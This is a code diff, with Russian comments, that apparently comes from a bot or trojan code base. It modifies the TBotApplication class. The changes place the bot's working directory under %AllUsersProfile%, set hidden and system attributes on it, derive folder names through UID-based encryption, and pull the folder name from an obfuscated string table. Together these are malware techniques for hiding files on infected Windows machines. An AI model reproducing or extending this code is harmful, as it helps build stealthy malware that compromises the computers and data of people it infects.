@@ -6,6 +6,7 @@
 #include "HTTPConsts.h"
 #include "BotDef.h"
 #include "BotHosts.h"
+#include "StrConsts.h"
 //#include "DbgRpt.h"
 
 
@@ -62,8 +63,7 @@ TBotApplication::TBotApplication()
 	FApplicationName = Buf.AsStr();
 
 	// Генерируем рабочие пути
-	FWorkPath       = MakeWorkPath(false);
-	FWorkSystemPath = MakeWorkPath(true);
+	FWorkPath = MakeWorkPath(false);
 
 	// Получаем идентификатор бота
 	FUID = GenerateBotID2();
@@ -114,19 +114,12 @@ string TBotApplication::WorkPath()
 }
 //-------------------------------------------------------------
 
-string TBotApplication::WorkSystemPath()
-{
-	// Путь к рабочему каталогу на системном диске, не привязан к пользователю
-	return FWorkSystemPath;
-}
-//-------------------------------------------------------------
-
 string TBotApplication::PrefixFileName()
 {
 	// Функция возвращает имя файла для хранения префикса
 	if (FPerfixFileName.IsEmpty())
 	{
-		FPerfixFileName = WorkSystemPath();
+		FPerfixFileName = WorkPath();
         FPerfixFileName += FILE_PREFIX;
 	}
 	return FPerfixFileName;
@@ -142,12 +135,12 @@ PCHAR TBotApplication::GetWorkFolder()
 		return BOT_WORK_FOLDER_NAME;
 
 	// Генерируем имя на основе константы обработанной ключём из уида
-	const static char WorkPath[] = "WnsBMT";
+	string WorkPath = GetStr(BotWorkPath);
 
-	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath, false);
+	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
 
 	// Копируем путь в глобальный массив
-	const char *Buf = (Name) ? Name : WorkPath;
+	const char *Buf = (Name) ? Name : WorkPath.t_str();
 
 	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
 
@@ -157,12 +150,12 @@ PCHAR TBotApplication::GetWorkFolder()
 	STR::Free(Name);
 
 	// Расчитываем хэш
-	BotWorkPathHash = CalcHash(BOT_WORK_FOLDER_NAME);
+	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
 
 	return BOT_WORK_FOLDER_NAME;
 }
 //----------------------------------------------------------------------------
-
+/*
 string TBotApplication::MakeWorkPath(bool SystemPath)
 {
 	// Функция генерирует рабочий путь
@@ -189,6 +182,31 @@ string TBotApplication::MakeWorkPath(bool SystemPath)
 	return Result;
 }
 //----------------------------------------------------------------------------
+*/
+
+string TBotApplication::MakeWorkPath(bool SystemPath)
+{
+	// Функция генерирует рабочий путь
+	string Result;
+
+	TMemory Path(MAX_PATH);
+	if (!pExpandEnvironmentStringsA("%AllUsersProfile%\\", Path.Buf(), MAX_PATH))
+		return Result;
+
+	Result = Path.AsStr();
+	Result += GetWorkFolder();
+	Result += "\\";
+
+	if (!DirExists(Result.t_str()))
+		pCreateDirectoryA(Result.t_str(), NULL);
+	pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
+
+
+	return Result;
+}
+//----------------------------------------------------------------------------
+
+
 
 void TBotApplication::SaveSettings()
 {
@@ -208,58 +226,30 @@ void TBotApplication::SaveSettings()
 //----------------------------------------------------------------------------
 
 
-
-
-
-
 PCHAR BOTDoGetWorkPath(bool InSysPath, PCHAR SubDir, PCHAR FileName)
 {
 	// Функция возвращает рабочий каталог бота
 
-	PCHAR Path = STR::Alloc(MAX_PATH);
+	string Path = Bot->WorkPath();
 
-	if (!pSHGetSpecialFolderPathA(NULL, Path, CSIDL_APPDATA, TRUE))
-		return NULL;
-
-
-	if (InSysPath)
-	{
-		// Получаем путь в системной папке
-		PCHAR Tmp = STR::Scan(Path, ':');
-		if (Tmp == NULL)
-			return NULL;
-        Tmp++;
-		*Tmp = 0;
-	}
-
-
-	PCHAR WorkPath = Bot->GetWorkFolder(); // резервируем на будущее
-
-	// Добавляем основной путь
-	StrConcat(Path, "\\");
-	StrConcat(Path, WorkPath);
-
-	if (!DirExists(Path))
-		pCreateDirectoryA(Path, NULL);
-
-	StrConcat(Path, "\\");
+	if (Path.IsEmpty()) return NULL;
 
 	// Добавляем подиректорию
 	if (!STR::IsEmpty(SubDir))
 	{
         PCHAR CryptDir = UIDCrypt::CryptFileName(SubDir, false);
 
-		StrConcat(Path, CryptDir);
+		Path += CryptDir;
 
-        STR::Free(CryptDir);
+		STR::Free(CryptDir);
 
-		if (!DirExists(Path))
-			pCreateDirectoryA(Path, NULL);
+		if (!DirExists(Path.t_str()))
+			pCreateDirectoryA(Path.t_str(), NULL);
 
     }
 
-	PCHAR Result = STR::New(2, Path, FileName);
-    STR::Free(Path);
+	PCHAR Result = STR::New(2, Path.t_str(), FileName);
+
 	return  Result;
 }
 //----------------------------------------------------------------------------
